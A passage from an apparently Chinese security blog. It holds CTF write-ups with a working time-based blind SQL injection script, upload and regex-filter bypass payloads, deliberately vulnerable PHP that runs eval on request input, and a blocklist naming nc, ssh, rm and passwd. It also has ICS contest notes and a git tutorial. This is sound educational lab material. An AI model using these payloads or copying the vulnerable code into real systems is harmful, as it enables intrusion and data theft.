$s)){</code>应为之前判断也是检测data所以数组可以绕过<br><code>payload filename=1.php&amp;data[]=s &lt; das</code><br>只有加上&lt;&gt;就可以  </p>\n<p><strong>题目四(数据保密存储)</strong>  </p>\n<ul>\n<li>页面很简单就是一个大马的登录界面，这个题说白了就是爆破，但是想了一下组合的可能太多，事后知道是4位数组，爆破出来的话就简单了。</li>\n</ul>\n<p><strong>题目五(漏洞检测)</strong><br><strong>题目</strong>提示网站存在漏洞，但是使用工具却没有发现问题所在，存在问题的参数是phone。<br>打开题目发现是登录注册的题，一般不是存在源码就是注入或者挨个测试参数。<br>简单的测试发现是挨个测试参数的问题，那就着重测试phone参数，最后发现是十六进制。<br>首先注册然后登录<br>check.php 查看此电话号码 有多少人使用，源代码中有提示 admin 的phone<br>之后注册填入phone 用户名不能重复 phone 是数字 不能是字符，猜测0x 的二次注入<br>麻烦的就是每次注册要使用不同的用户。  </p>\n<p>思路整理一下就可以开始撸py脚本了<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"comment\"># print hex_s</span></span><br><span class=\"line\"><span class=\"comment\"># database=\"webdb\"</span></span><br><span class=\"line\">database=<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"comment\">#pass c199055fc2c7a66eb257dd3c865398</span></span><br><span class=\"line\">strstr=<span class=\"string\">\"-\\&#123;0123456789abcdefghijklmnopqrstuvwxyz\\&#125;\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">20</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> z <span class=\"keyword\">in</span> strstr:</span><br><span class=\"line\">        reg_url=<span class=\"string\">\"http://172.16.5.105/register.php\"</span></span><br><span class=\"line\">        username=<span class=\"string\">'mmp'</span>+str(random.randint(<span class=\"number\">9999</span>, <span class=\"number\">10000000</span>))</span><br><span class=\"line\">        sqlstr=<span class=\"string\">\"1 and(if((ascii(substring((select phone from user limit 0,1),%s,1))=%s),sleep(3),1))\"</span> %(x,ord(z))</span><br><span class=\"line\">        <span class=\"comment\">#sqlstr=\"1 and(if((ascii(substring(database(),%s,1))=%s),sleep(3),0))\" %(x,z)</span></span><br><span class=\"line\">        <span class=\"comment\"># print sqlstr</span></span><br><span class=\"line\">        hex_s=<span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> sqlstr:</span><br><span class=\"line\">            hex_s=hex_s+hex(ord(i)).replace(<span class=\"string\">'0x'</span>,<span class=\"string\">''</span>)</span><br><span class=\"line\">        r_data=&#123;</span><br><span class=\"line\">        <span class=\"string\">\"username\"</span>:username,</span><br><span class=\"line\">        <span class=\"string\">\"password\"</span>:<span class=\"string\">\"123\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"phone\"</span>:<span class=\"string\">\"0x\"</span>+hex_s</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res=requests.post(reg_url, data=r_data,timeout=<span class=\"number\">20</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print username</span></span><br><span class=\"line\">        <span class=\"comment\"># print res.content</span></span><br><span class=\"line\">        <span class=\"comment\">#先注册</span></span><br><span class=\"line\">        log_url=<span class=\"string\">\"http://172.16.5.105/login.php\"</span></span><br><span class=\"line\">        log_data=&#123;</span><br><span class=\"line\">            <span class=\"string\">\"username\"</span>:username,</span><br><span class=\"line\">            <span class=\"string\">\"password\"</span>:<span class=\"string\">\"123\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        S=requests.session()</span><br><span class=\"line\">        l_res=S.post(log_url, data=log_data,timeout=<span class=\"number\">20</span>)</span><br><span class=\"line\">        index_url=<span class=\"string\">\"http://172.16.5.105/index.php\"</span></span><br><span class=\"line\">        index_res=S.get(index_url)</span><br><span class=\"line\">        <span class=\"comment\"># print index_res.content</span></span><br><span class=\"line\">        check_url=<span class=\"string\">\"http://172.16.5.105/check.php\"</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            check_res=S.get(check_url,timeout=<span class=\"number\">3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception, e:</span><br><span class=\"line\">            <span class=\"comment\"># print sqlstr</span></span><br><span class=\"line\">            database=database+z</span><br><span class=\"line\">            <span class=\"keyword\">print</span> database</span><br></pre></td></tr></table></figure></p>\n<p>赛后把这个题目的源代码复现了一下 详细的功能可以看 <a href=\"https://github.com/Huseck/CTF\" target=\"_blank\" rel=\"noopener\">github</a> 测评文件。<br><strong>其他题目</strong><br>当时比赛就一下午的时间，一个人做时间上有点来不及，后面的题目，大概是绕waf注入的题目，没有来得及仔细分析时间就到了。</p>\n<h3 id=\"工控的比赛\"><a href=\"#工控的比赛\" class=\"headerlink\" title=\"工控的比赛\"></a>工控的比赛</h3><p>以前也也没有接触过工控安全，所以赛前准备了一下知识点和方法。<br>比赛地点是在杭州的电子科技大学<br>比赛时间19-21<br>都是从早8:00到晚20:00<br>前两天是PLC硬件的调试和挖掘<br>前期准备就是尝试收集网上的挖掘方法和已知的漏洞exp，工业漏洞安全报告文档等。<br>干货比较十足的是<br>KCon2015 Exploit PLC on the internet.pdf<br>KCon2015 工控系统安全威胁与应对探索.pdf<br><strong>漏洞体现可以从 端口、协议和服务三方面进行体现</strong><br><strong>测试挖掘的方向</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内存溢出区内的操作不正确的限制</span><br><span class=\"line\">• 不正确的输入验证</span><br><span class=\"line\">• 限制目录路径名的不正确规则</span><br><span class=\"line\">• 权限和访问控制</span><br><span class=\"line\">• 信息曝光</span><br><span class=\"line\">• 凭证管理</span><br><span class=\"line\">• 验证不正确</span><br><span class=\"line\">• 资源管理错误</span><br><span class=\"line\">• 页面生成过程中的不正确(跨站脚本)</span><br><span class=\"line\">• 数字错误</span><br><span class=\"line\">SCADA网络安全防范</span><br><span class=\"line\">虽然无法在部署之前了解和检测所有安全漏洞，但可以肯定的是通过采用下面纵深防御措施一定可以主动地减轻攻击者对SCADA网络造成的安全破坏：</span><br><span class=\"line\">• 开发安全策略；</span><br><span class=\"line\">• 实现ACL；</span><br><span class=\"line\">• 使用MAC地址过滤；</span><br><span class=\"line\">• 使用VLAN分段；</span><br><span class=\"line\">• 加强SCADA设备物理安全，包括警报和防撬管理；</span><br><span class=\"line\">• 不允许使用第三方USB及相关存储设备；</span><br><span class=\"line\">• 实现支持SCADA协议防御机制的NIDS/NIPS；</span><br><span class=\"line\">• 整合操作系统和固件升级（包括补丁维护）；</span><br><span class=\"line\">• 实现高强度的加密功能；</span><br><span class=\"line\">• 确保已经准备好二重或三重身份验证策略；</span><br><span class=\"line\">• 确保计划内的内部安全评估得到如期执行；</span><br><span class=\"line\">• 考虑使用工控漏扫ICSscan以及包含fuzzing测试功能的ICSscan定期对工控系统进行安全评估；</span><br><span class=\"line\">• 如果可能的话，使用诸如SSH、DNPsec、TLS、DTLS、SSL、PKI和IPsec之类的保护性协议；</span><br><span class=\"line\">• 如果使用的是拨号调制解调器，那么实现支持活动日志、加密、名字和口令身份验证的增强型安全措施；</span><br><span class=\"line\">• 实现一套SIEM安全信息和事件管理系统来完成日志聚合、日志审查和审计分析；</span><br><span class=\"line\">• 为所有合适的防火墙、交换机、路由器、NIPS和NIDS设备实现可扩展的边界网络策略。</span><br></pre></td></tr></table></figure></p>\n<p>第一天趟了一上午，然后就会宾馆了，主要是熟悉了一下PLC_config控制软件，进行对PLC设备调试一些执行和抓抓包分析一下。<br>第二天发现使用AlphaFuzzer1.6 进行网络协议fuzz结果可以把plc直接跑到宕机。也算是一个漏洞吧，哈哈。<br><img src=\"6.png\" alt=\"\"><br>然后再抓包分析，感觉PLC设备没有什么验证机制，fuzz起来还是能发现它挺脆弱的。<br>然后写文档走人了，没有报进入决赛的希望，什么都不会，在杭电的体育馆中待着还是挺冷的。<br>最后一点SCADA软件检测就更加蒙蔽了。应该算是草草离场了。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>网络安全的趋势感觉要覆盖很广的领域，想要能发现问题，编程技能和基础知识就显得更加的重要了。漏洞挖掘的思路和手段就应该加强，后面学习一下fuzzing的技术和手段，希望以后能沉住气，踏踏实实的走好每一步。最后想要这两场比赛的题目和SCADA软件的可以私聊，一起交流。</p>\n","categories":["比赛"],"tags":["CTF","比赛"]},{"title":"正则调试案例","url":"https://www.xjseck.com/2017/10/27/正则调试案例/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>我们在进行正则调试的时候，首先是需要读懂正则表达式的意思，其次是进行绕过或者fuzz，后续的才能能好的绕过。<br>正则调试工具<br><a href=\"https://regexper.com\" target=\"_blank\" rel=\"noopener\">https://regexper.com</a> 生成图进行解读正则表达式<br>调试前的基础<br>PHP 我们一般用的比较多的正则判断函数preg_match()、preg_replace()、preg_filter()等函数。这里我们就介绍preg_match()函数<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )</span><br></pre></td></tr></table></figure></p>\n<p>搜索 subject 与 pattern 给定的正则表达式的一个匹配  </p>\n<ol>\n<li>参数说明</li>\n</ol>\n<ul>\n<li>$pattern: 要搜索的模式，字符串形式。</li>\n<li>$subject: 输入字符串。</li>\n<li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本，如果是第一个子模式匹配到的数据也是显示在$matches[0]中;$matches[1] 将包含第一个捕获子组匹配到的文本，以此类推, print_r($matches) 显示匹配的内容。</li>\n<li>$flags：flags 可以被设置为以下标记值：<ul>\n<li>PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li>\n</ul>\n</li>\n<li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)</li>\n</ul>\n<h3 id=\"实例一\"><a href=\"#实例一\" class=\"headerlink\" title=\"实例一\"></a>实例一</h3><p>直接上代码<br><strong>index.php</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by seck.</span></span><br><span class=\"line\"><span class=\"comment\"> * Date: 2017/10/27</span></span><br><span class=\"line\"><span class=\"comment\"> * Time: 20:39</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"comment\">//index.php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'config.php'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'phpinfo'</span>]))&#123;</span><br><span class=\"line\">    php_info();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'eval'</span>]))&#123;</span><br><span class=\"line\">    $filter = <span class=\"string\">'/_|(.*)(\\'|\\\"|\\`|\\()(.*)(\\'|\\\"|\\`|\\))|(.php|\\=|\\$)/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match($filter, $_GET[<span class=\"string\">'eval'</span>],$matches))&#123;</span><br><span class=\"line\">        print_r($matches);</span><br><span class=\"line\">        var_dump($_GET[<span class=\"string\">'eval'</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'nope'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    var_dump($_GET[<span class=\"string\">'eval'</span>]);</span><br><span class=\"line\">    <span class=\"comment\">//403 forbidden : system filter</span></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'eval'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure></p>\n<p><strong>config.php</strong><br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by seck.</span></span><br><span class=\"line\"><span class=\"comment\"> * Date: 2017/10/27</span></span><br><span class=\"line\"><span class=\"comment\"> * Time: 20:39</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"> <span class=\"comment\">//config.php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_info</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">'PHP Version 7.0.18-0ubuntu0.16.10.1'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$filter = <span class=\"string\">\"/\\||\\/|\\.\\.|config|fwrite|fputs|shutdown|halt|\"</span>.</span><br><span class=\"line\">    <span class=\"string\">\"reboot|init|rm|mv|cp|remove|rename|copy|grep|nc|unlink|find|\"</span>.</span><br><span class=\"line\">    <span class=\"string\">\"apt|yum|passwd|chmod|chown|ln|kill|lilo|ssh|telnet/i\"</span>;</span><br><span class=\"line\">$implode = implode($_REQUEST);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match($filter, $implode))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">'403 forbidden'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>首先过config的判断比较简单 直接使用system();<br>index.php 的正则才是关键<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$filter = &apos;/_|(.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\))|(.php|\\=|\\$)/i&apos;;</span><br></pre></td></tr></table></figure></p>\n<p>首先分析正则是 从大分三大块 全部是6段，可以使用?eval=.php测试显示<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_     |    (.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\))    |     (.php|\\=|\\$)</span><br></pre></td></tr></table></figure></p>\n<p>到这里我们应该知道第二大段的有3个子模式，所以在匹配时需要同时满足这三个子模式才能匹配，如果我们能同时满足这个三个子模式也就绕过了。<br>比如<br><code>$filter = &#39;/_|(a)(bb)(c)|(.php|\\=|\\$)/i&#39;;</code><br>测试?eval=abbc 才能匹配<br>最后我们想构造形如?eval=system(‘cat flag.php’); 进行读取flag文件<br>这里我们可以使用%0a绕过 贪婪模式(是可以匹配上也可以没有匹配上)另两个模式就必须要匹配上四种中的一种 第二个大段的正则也就绕过了，但是第三个大模式.php没有绕过<br>这里我们使用linux 的cat+ 命令查看所有的文件内容即可bp抓一下数据包<br><strong>最后的payload:?eval=system(%0a”%0acat+“%0a)</strong><br>我们分析一下怎么绕过第二段模式的 system(%0a 是绕过(.) 接着双引号满足第二个<br>接着是(.*)我们可有可无 最后必须要满足<br>但是运行在windows的环境下，却不能执行成功，也不知道为什么，知道表哥求py一下。</p>\n","categories":["正则"],"tags":["PHP","正则"]},{"title":"git控制管理学习","url":"https://www.xjseck.com/2017/10/27/git控制管理学习/","content":"<h2 id=\"管理github\"><a href=\"#管理github\" class=\"headerlink\" title=\"管理github\"></a>管理github</h2><p>使用git配合管理github仓库<br>首先在github上创建仓库<br><img src=\"1.png\" alt=\"\"><br>然后就是你需要设置自己git的ssh-keys进行对自己github仓库的管理<br>具体设置参考<a href=\"http://www.xjeck.com/2017/09/07/博客的搭建过程/\" target=\"_blank\" rel=\"noopener\">key-add</a><br>之后就是本地创建一个git<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#先创建一个文件夹和远程仓库项目的名称一样然后</span><br><span class=\"line\">$ git init</span><br><span class=\"line\">$ git remote add master https://github.com/Huseck/scan_kill_php_shell.git  指定远程仓库+</span><br><span class=\"line\">$ git remote -v //显示一下信息</span><br><span class=\"line\">$ git pull --rebase master master   获取一下readme.md 的信息</span><br><span class=\"line\">$ git add .   //添加本地文件</span><br><span class=\"line\">$ git commit -m &quot;first push&quot; //保存一下信息</span><br><span class=\"line\">$ git push -u master master  //     上传</span><br><span class=\"line\">//之后的每次文件的改变之后使用</span><br><span class=\"line\">$ git add .</span><br><span class=\"line\">$ git commit -m &quot;修改的信息&quot;</span><br><span class=\"line\">$ git push</span><br></pre></td></tr></table></figure></p>\n<p></p><h3>建议以后的推送使用commit 填写修改的信息比较好回滚</h3><br>其他经常使用到的功能<br>git工具下载：<a href=\"https://git-scm.com/download/\" target=\"_blank\" rel=\"noopener\">https://git-scm.com/download/</a><br>配置git信息<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name &quot;Your name&quot;</span><br><span class=\"line\">git config --global user.email &quot;Your email&quot;</span><br></pre></td></tr></table></figure><p></p>\n<h3 id=\"1、git本地仓库初始化\"><a href=\"#1、git本地仓库初始化\" class=\"headerlink\" title=\"1、git本地仓库初始化\"></a>1、git本地仓库初始化</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git init</span><br><span class=\"line\">git remote remove/add origin git仓库地址</span><br><span class=\"line\">git pull origin master master //取远程主分支</span><br><span class=\"line\">git pull origin Liang Liang //取远程Liang的分支</span><br></pre></td></tr></table></figure>\n<h3 id=\"2、提交远程到仓库\"><a href=\"#2、提交远程到仓库\" class=\"headerlink\" title=\"2、提交远程到仓库\"></a>2、提交远程到仓库</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;提交信息&quot;</span><br><span class=\"line\">git push origin MoLiang //提交到远程分支MoLiang</span><br></pre></td></tr></table></figure>\n<h3 id=\"3、分支管理\"><a href=\"#3、分支管理\" class=\"headerlink\" title=\"3、分支管理\"></a>3、分支管理</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch Liang //创建Liang的分支</span><br><span class=\"line\">git branch origin/Liang //创建Liang的远程分支</span><br></pre></td></tr></table></figure>\n<h3 id=\"4、合并主分区\"><a href=\"#4、合并主分区\" class=\"headerlink\" title=\"4、合并主分区\"></a>4、合并主分区</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master (主分支)</span><br><span class=\"line\">git merge origin/MoLiang</span><br><span class=\"line\">git push origin master:master //$ git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5、回滚\"><a href=\"#5、回滚\" class=\"headerlink\" title=\"5、回滚\"></a>5、回滚</h3><p>主分支<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$git status //查看仓库状态</span><br><span class=\"line\">$git diff //查看本地和远程仓库的不同</span><br><span class=\"line\">$git log 查看commit的sha1值+      --pretty=oneline参数简练显示</span><br><span class=\"line\">$git log -p -2 //比对一下内容</span><br><span class=\"line\">//进行回滚到上一个版本时，此时的版本就会被删除，本地的文件内容就回滚到上一个版本时的内容，之后push到仓库</span><br><span class=\"line\">$git reset --hard b353d4653da422aa6be61696c5c6379bffd7bfc5</span><br><span class=\"line\">$git push -f -u master master //本地和远程仓库的文件内容都回到了上一个版本</span><br><span class=\"line\">//如果此时你后悔了，还想回到最新的版本中</span><br><span class=\"line\">$git reflog //61e013c HEAD@&#123;7&#125;: commit: 增加相似md5值，匹配内容</span><br><span class=\"line\">$git reset --hard 61e013c</span><br><span class=\"line\">$git push -f -u master master</span><br><span class=\"line\">//同想能达到后悔的目的</span><br></pre></td></tr></table></figure></p>\n","categories":["git"],"tags":["git","仓库"]},{"title":"一道有意思的注入题","url":"https://www.xjseck.com/2017/10/16/一道有意思的注入题/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>“平衡信息”杯-南宁市第二届网络与信息安全技术大赛 web_300题目复现</p>\n<h2 id=\"分析过程\"><a href=\"#分析过程\" class=\"headerlink\" title=\"分析过程\"></a>分析过程</h2><p>先直接上代码<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$db=<span class=\"string\">\"db\"</span>;</span><br><span class=\"line\">$db_name=<span class=\"string\">\"###\"</span>;</span><br><span class=\"line\">$db_pw=<span class=\"string\">\"###\"</span>;</span><br><span class=\"line\">$host=<span class=\"string\">\"localhost\"</span>;</span><br><span class=\"line\">$conn=mysqli_connect($host,$db_name,$db_pw,$db);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$conn)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(mysqli_errno());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_GET <span class=\"keyword\">as</span> $get)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_array($get))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($get <span class=\"keyword\">as</span> $g)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(stristr($g,<span class=\"string\">'select'</span>)!=<span class=\"keyword\">FALSE</span> &amp;&amp; stristr($g,<span class=\"string\">'union'</span>)!=<span class=\"keyword\">FALSE</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">'stop attack!'</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(stristr($g,<span class=\"string\">'select'</span>)!=<span class=\"keyword\">FALSE</span> &amp;&amp; stristr($g,<span class=\"string\">'from'</span>)!=<span class=\"keyword\">FALSE</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">'no attack!'</span>);   </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(stristr($get,<span class=\"string\">'select'</span>)!=<span class=\"keyword\">FALSE</span> &amp;&amp; stristr($get,<span class=\"string\">'union'</span>)!=<span class=\"keyword\">FALSE</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">'stop attack!'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$id=$_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(is_array($id))&#123;</span><br><span class=\"line\">    $sql=<span class=\"string\">'select * from user where id  in('</span>.implode(<span class=\"string\">','</span>,$id).<span class=\"string\">')'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"2=&gt;\"</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    $sql=<span class=\"string\">'select * from user where id ='</span>.$id;</span><br><span class=\"line\">    <span 